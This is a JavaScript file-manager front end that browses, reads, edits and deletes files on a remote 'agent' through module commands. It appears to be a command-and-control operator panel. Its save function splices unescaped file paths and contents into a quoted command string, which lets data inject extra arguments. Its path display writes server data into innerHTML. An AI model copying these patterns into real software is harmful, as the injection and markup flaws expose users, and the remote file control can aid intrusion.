function getAgentIdFromHash() {
    const hash = window.location.hash || "";
    return hash.startsWith("#") ? hash.slice(1) : hash;
}

function isDirectory(fileAttributes) {
    return (fileAttributes & 0x10) !== 0;
}

function formatSize(bytes) {
    if (bytes === null || bytes === undefined) {
        return "-";
    }

    if (bytes < 1024) {
        return `${bytes} bytes`;
    }

    if (bytes < 1024 * 1024) {
        return `${(bytes / 1024).toFixed(1)} KB`;
    }

    if (bytes < 1024 * 1024 * 1024) {
        return `${(bytes / (1024 * 1024)).toFixed(1)} MB`;
    }

    return `${(bytes / (1024 * 1024 * 1024)).toFixed(1)} GB`;
}

let currentOpenFilePath = "";
let currentFileTextContent = "";
let currentFileHexContent = "";
let currentViewMode = "text";

function setEditorContent(value, mode = "text") {
    const editor = document.getElementById("file-read-modal-editor");
    const toggle = document.getElementById("file-read-hex-toggle");

    currentViewMode = mode;

    if (mode === "hex") {
        editor.value = currentFileHexContent;
        editor.classList.add("hex-mode");
        toggle.checked = true;
    } else {
        editor.value = currentFileTextContent;
        editor.classList.remove("hex-mode");
        toggle.checked = false;
    }

    if (typeof value === "string") {
        editor.value = value;
    }
}


function openReadModal(title, path, content, binary) {
    currentOpenFilePath = path;
    const editor = document.getElementById("file-read-modal-editor");

    document.getElementById("file-read-modal-title").textContent = title || "File editor";
    document.getElementById("file-read-modal-path").textContent = path || "";

    if (binary) {
        editor.value = "⚠️ This file appears to be binary or hex and cannot be displayed.";
        editor.disabled = true;

        document.getElementById("file-read-save-btn").style.display = "none";
    } else {
        editor.value = content ?? "";
        editor.disabled = false;

        document.getElementById("file-read-save-btn").style.display = "inline-flex";
    }

    document.getElementById("file-read-modal").classList.remove("hidden");
}

function closeReadModal() {
    document.getElementById("file-read-modal").classList.add("hidden");
}

function syncCurrentEditorBuffer() {
    const editor = document.getElementById("file-read-modal-editor");

}

function escapeHtml(value) {
    return String(value ?? "")
        .replaceAll("&", "&amp;")
        .replaceAll("<", "&lt;")
        .replaceAll(">", "&gt;")
        .replaceAll('"', "&quot;")
        .replaceAll("'", "&#39;");
}

function getCurrentPath() {
    return document.getElementById("current-path").textContent || "";
}

function joinPath(base, name) {
    if (!base) {
        return name;
    }
    if (base.endsWith("\\") || base.endsWith("/")) {
        return `${base}${name}`;
    }
    return `${base}\\${name}`;
}

async function fillFileTable(oldpath) {
    const tableBody = document.getElementById("file-table-body");
    const statusMessageEl = document.getElementById("status-message");

    if (!tableBody) {
        console.error("Missing #file-table-body");
        return;
    }

    tableBody.innerHTML = `
        <tr>
            <td colspan="4" class="muted">Loading...</td>
        </tr>
    `;

    if (statusMessageEl) {
        statusMessageEl.textContent = "Loading files...";
    }

    try {
        const data = await dir();
        console.log("fillfiletable " + oldpath);

        if (!data || data.result !== "success") {
            await cd(oldpath);
            await pwd();
            await fillFileTable("");
            return;
        }

        const items = data.message.results.sort((a, b) => {
            const aIsDir = isDirectory(a.file_attributes);
            const bIsDir = isDirectory(b.file_attributes);

            if (aIsDir !== bIsDir) {
                return aIsDir ? -1 : 1;
            }

            return a.file_name.localeCompare(b.file_name);
        });

        if (items.length === 0) {
            tableBody.innerHTML = `
                <tr>
                    <td colspan="4" class="muted">This folder is empty.</td>
                </tr>
            `;

            if (statusMessageEl) {
                statusMessageEl.textContent = "No files found.";
            }

            return;
        }

        tableBody.innerHTML = items.map((item) => {
            const name = escapeHtml(item.file_name);
            const isDir = isDirectory(item.file_attributes);
            const type = isDir ? "Folder" : "File";
            const size = isDir ? "-" : formatSize(item.end_of_file);
            const icon = isDir ? "📁" : "📄";

            return `
                <tr>
                    <td>
                        ${
                            isDir
                                ? `<a href="#" class="file-manager-dir-link" data-name="${escapeHtml(item.file_name)}">${icon} ${name}</a>`
                                : `<a href="#" class="file-manager-read-link" data-name="${escapeHtml(item.file_name)}">${icon} ${name}</a>`
                        }
                    </td>
                    <td>${type}</td>
                    <td>${size}</td>
                    <td>
                        <div class="file-actions">
                            ${
                                isDir
                                    ? ""
                                    : `<a href="#" class="btn-link file-manager-download-link" data-file="${escapeHtml(item.file_name)}">Download</a>`
                            }
                            <button type="button" class="btn btn-danger file-manager-delete-btn" data-file="${escapeHtml(item.file_name)}">Delete</button>
                            
                        </div>
                    </td>
                </tr>
            `;
        }).join("");

        if (statusMessageEl) {
            statusMessageEl.textContent = `Loaded ${items.length} item(s).`;
        }

        tableBody.querySelectorAll(".file-manager-dir-link").forEach((link) => {
            link.addEventListener("click", async (event) => {
                event.preventDefault();

                const clickedName = event.currentTarget.dataset.name;

                try {
                    if (statusMessageEl) {
                        statusMessageEl.textContent = `Opening ${clickedName}...`;
                    }

                    const previousPath = getCurrentPath();
                    await cd(joinPath(previousPath, clickedName));
                    await pwd();
                    await fillFileTable(previousPath);

                    if (statusMessageEl) {
                        statusMessageEl.textContent = `Opened ${clickedName}.`;
                    }
                } catch (error) {
                    console.error("Folder navigation error:", error);

                    if (statusMessageEl) {
                        statusMessageEl.textContent = `Could not open ${clickedName}.`;
                    }
                }
            });
        });

        tableBody.querySelectorAll(".file-manager-read-link").forEach((link) => {
            link.addEventListener("click", async (event) => {
                event.preventDefault();

                const fileName = event.currentTarget.dataset.name;
                const fullPath = joinPath(getCurrentPath(), fileName);

                try {
                    if (statusMessageEl) {
                        statusMessageEl.textContent = `Reading ${fileName}...`;
                    }

                    openReadModal(fileName, fullPath, "Loading...", false);
                    const data = await read(fullPath);

                    const content =
                        data?.message?.retval ??
                        data?.message?.content ??
                        data?.message?.text ??
                        data?.message ??
                        "[empty]";
                    if(data.message == "binary content"){
                        openReadModal(fileName, fullPath, typeof content === "string" ? content : JSON.stringify(content, null, 2), true);
                    }
                    else openReadModal(fileName, fullPath, data.message.data, false);

                    if (statusMessageEl) {
                        statusMessageEl.textContent = `Opened ${fileName}.`;
                    }
                } catch (error) {
                    console.error("Read file error:", error);
                    openReadModal(fileName, fullPath, "Could not read file.", false);

                    if (statusMessageEl) {
                        statusMessageEl.textContent = `Could not read ${fileName}.`;
                    }
                }
            });
        });

    } catch (error) {
        console.error("fillFileTable error:", error);

        tableBody.innerHTML = `
            <tr>
                <td colspan="4" class="muted">Failed to load files.</td>
            </tr>
        `;

        if (statusMessageEl) {
            statusMessageEl.textContent = "Could not load files.";
        }
    }
}

async function dir() {
    const agentId = getAgentIdFromHash();
    const moduleName = "dir";

    try {
        const response = await fetch(window.run_module_API, {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify({
                agent_id: agentId,
                module: moduleName
            })
        });

        const data = await response.json();
        return data;

    } catch (error) {
        console.error("dir() error:", error);
        throw error;
    }
}

async function pwd() {
    const agentId = getAgentIdFromHash();
    const moduleName = "pwd";

    try {
        const response = await fetch(window.run_module_API, {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify({
                agent_id: agentId,
                module: moduleName
            })
        });

        const data = await response.json();
        document.getElementById("current-path").innerHTML = data.message.pwd;
        return data;

    } catch (error) {
        console.error("pwd() error:", error);
        throw error;
    }
}

async function cd(path) {
    const agentId = getAgentIdFromHash();
    const moduleName = "cd " + path;

    try {
        const response = await fetch(window.run_module_API, {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify({
                agent_id: agentId,
                module: moduleName
            })
        });

        if (!response.ok) {
            throw new Error(`Request failed: ${response.status}`);
        }

        const data = await response.json();
        document.getElementById("current-path").innerHTML = data.message.retval;
        return data;

    } catch (error) {
        console.error("cd() error:", error);
        throw error;
    }
}

async function read(path) {
    const agentId = getAgentIdFromHash();
    const moduleName = `read "${path}"`;

    try {
        const response = await fetch(window.run_module_API, {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify({
                agent_id: agentId,
                module: moduleName
            })
        });

        if (!response.ok) {
            throw new Error(`Request failed: ${response.status}`);
        }

        return await response.json();

    } catch (error) {
        console.error("read() error:", error);
        throw error;
    }
}

async function save(path, content) {
    const agentId = getAgentIdFromHash();
    const moduleName = `write '${path}' '${content}'`;

    try {
        const response = await fetch(window.run_module_API, {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify({
                agent_id: agentId,
                module: moduleName
            })
        });

        if (!response.ok) {
            throw new Error(`Request failed: ${response.status}`);
        }

        return await response.json();
    } catch (error) {
        console.error("save() error:", error);
        throw error;
    }
}

document.addEventListener("DOMContentLoaded", async () => {
document.getElementById("file-read-modal-editor").addEventListener("change", () =>{
    currentFileTextContent = document.getElementById("file-read-modal-editor").value;
});
document.getElementById("file-read-save-btn").addEventListener("click", async () => {
    const statusMessageEl = document.getElementById("status-message");

        try {

            if (statusMessageEl) {
                statusMessageEl.textContent = `Saving ${currentOpenFilePath}...`;
            }
            console.log(currentOpenFilePath);
            console.log(currentFileTextContent);
            await save(currentOpenFilePath, currentFileTextContent);

            if (statusMessageEl) {
                statusMessageEl.textContent = "File saved successfully.";
            }
        } catch (error) {
            console.error("Save file error:", error);

            if (statusMessageEl) {
                statusMessageEl.textContent = "Could not save file.";
            }
        }
    });
    document.getElementById("file-read-modal-close").addEventListener("click", closeReadModal);
    document.getElementById("file-read-modal-backdrop").addEventListener("click", closeReadModal);

    document.addEventListener("keydown", (event) => {
        if (event.key === "Escape") {
            closeReadModal();
        }
    });

    await pwd();
    await fillFileTable("");
});